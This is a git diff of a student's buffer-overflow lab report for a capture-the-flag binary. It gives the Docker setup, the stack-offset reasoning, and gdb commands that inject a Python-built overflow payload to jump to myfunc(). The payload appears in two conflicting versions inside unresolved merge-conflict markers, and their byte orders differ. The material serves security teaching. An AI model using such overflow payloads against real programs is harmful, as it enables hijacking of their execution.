@@ -1,6 +1,8 @@
 # Lab 2
 ## 1. File ctf.c
 
+>docker run -it --privileged -v "C:\Users\Kiet\Documents\huy\ute\INSE\Security-labs\Software\buffer-overflow:/home/seed/seclabs" img4lab
+
 **Summarizing**
 
     In this case, the buf[] array has 128 bytes, but the fgets() command reads up to 133 bytes.
@@ -26,7 +28,14 @@
    
  - According to the stackframes above, in vuln(), the buf[] array has 100 bytes and ebp is 4 bytes, total is 104 bytes to reach return address. 
  - Insert 104 'a' characters to reach the exact memory location of the func variable, then insert the address of the myfunc() function "0x0804851b" to execute the myfunc()function, add value for q, p, and return address.
-    **Connect gdb and run again by this command:** 
+    
+    **Connect gdb and run by this command:** 
+<<<<<<< HEAD
+    >r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'\xe0\x83\x04\x08'+'\x11\x12\x08\x04'+'\x62\x42\x64\x44')")
+    
+    ![alt text](image-30.png)
+=======
     >r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'\xe0\x83\x08\x04'+'\x11\x12\x04\x08'+'\x62\x42\x64\x44')")
 
     ![alt text](./images/image-36.png)
+>>>>>>> 638ef63 (fix image)
